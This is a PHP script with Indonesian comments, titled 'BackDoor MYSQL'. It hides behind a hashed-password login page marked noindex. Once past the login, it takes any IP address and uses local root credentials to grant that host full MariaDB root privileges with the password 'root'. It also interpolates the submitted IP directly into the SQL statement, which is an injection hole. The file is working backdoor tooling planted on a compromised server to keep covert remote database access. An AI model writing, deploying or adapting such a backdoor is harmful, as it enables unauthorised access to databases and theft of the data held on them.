<?php
// $GLOBALS['pass'] = "1e0a88d8c7cceab495039fc906bf0ec2e9951c2a"; 
$GLOBALS['pass'] = "63982e54a7aeb0d89910475ba6dbd3ca6dd4e5a1";

if(!function_exists('auth')){
	function auth(){
		if(isset($GLOBALS['pass']) && (trim($GLOBALS['pass']) != '')){
			$c = $_COOKIE;
			$p = $_POST;
			if(isset($p['pass'])){
				$your_pass = sha1(md5($p['pass']));
				if($your_pass == $GLOBALS['pass']){
					setcookie("pass", $your_pass, time() + 36000, "/");
					header("Location: " . $_SERVER['PHP_SELF']); // Replaced get_self() with $_SERVER['PHP_SELF']
					exit(); // Added exit to ensure no further code is executed after header
				}
			}

			if(!isset($c['pass']) || ((isset($c['pass']) && ($c['pass'] != $GLOBALS['pass'])))){
				$res = "<!doctype html>
		<html>
		<head>
		<meta charset='utf-8'>
		<meta name='robots' content='noindex, nofollow, noarchive'>
		<meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no'>
		<style>
			body { background: #f8f8f8; color: #000000; padding: 0; margin: 0; }
			form { display: flex; justify-content: center; align-items: center; height: 100vh; }
			input[type='password'] { font-size: 20px; width: 300px; padding: 10px; border: 1px solid #cccccc; border-radius: 8px; color: #000000; text-align: center; }
		</style>
		</head>
		<body>
		<form method='post'>
			<input type='password' name='pass' placeholder='Enter password' autofocus>
		</form>
		</body>
		</html>";
				echo $res;
				die();
			}
		}
	}
}

// Panggil fungsi autentikasi
auth();
?>
<!doctype html>
<html>
<head>
<title>Halaman Aman</title>
<meta charset='utf-8'>
<meta name='robots' content='noindex, nofollow, noarchive'>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<style>
    body { background: #f0f0f0; color: #222222; font-family: 'Arial', sans-serif; }
    h1 { background: #E7E7E7; padding: 10px; border-radius: 8px; text-align: center; }
    .container { padding: 20px; }
    form { display: flex; flex-direction: column; align-items: center; margin-top: 20px; }
    label { margin-bottom: 10px; font-weight: bold; }
    input[type="text"] { font-size: 16px; width: 300px; padding: 10px; border: 1px solid #cccccc; border-radius: 4px; }
    button { margin-top: 10px; padding: 10px 20px; font-size: 16px; border: none; border-radius: 4px; background-color: #4CAF50; color: white; cursor: pointer; }
    button:hover { background-color: #45a049; }
    .success-message { color: green; font-weight: bold; margin-top: 20px; }
</style>
</head>
<body>
<div class="container">
    <h1>Selamat Datang di BackDoor MYSQL</h1>
    <form method="POST">
        <label for="allowed_host">Masukkan IP Host yang Akan Diizinkan:</label>
        <input type="text" name="allowed_host" id="allowed_host" required>
        <button type="submit">Submit</button>
    </form>

    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        // Konfigurasi koneksi ke database
        $server = "localhost"; // koneksi ke server MariaDB lokal
        $username = "root";
        $password = ""; // sesuaikan dengan password root MariaDB Anda

        // Ambil IP host yang diizinkan dari input pengguna
        $allowed_host = $_POST['allowed_host'];

        try {
            // Membuat koneksi ke MariaDB
            $pdo = new PDO("mysql:host=$server", $username, $password);
            $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

            // Query untuk mengizinkan akses dari IP tertentu tanpa password
            $query = "GRANT ALL PRIVILEGES ON *.* TO 'root'@'$allowed_host' IDENTIFIED BY 'root' WITH GRANT OPTION;";
            $pdo->exec($query);

            // Menyimpan perubahan
            $pdo->exec("FLUSH PRIVILEGES;");
            
            echo "<div class='success-message'>Akses berhasil diberikan untuk host $allowed_host dengan username root & password root.</div>";
        } catch (PDOException $e) {
            echo "Error: " . $e->getMessage();
        }
    }
    ?>
</div>
</body>
</html>
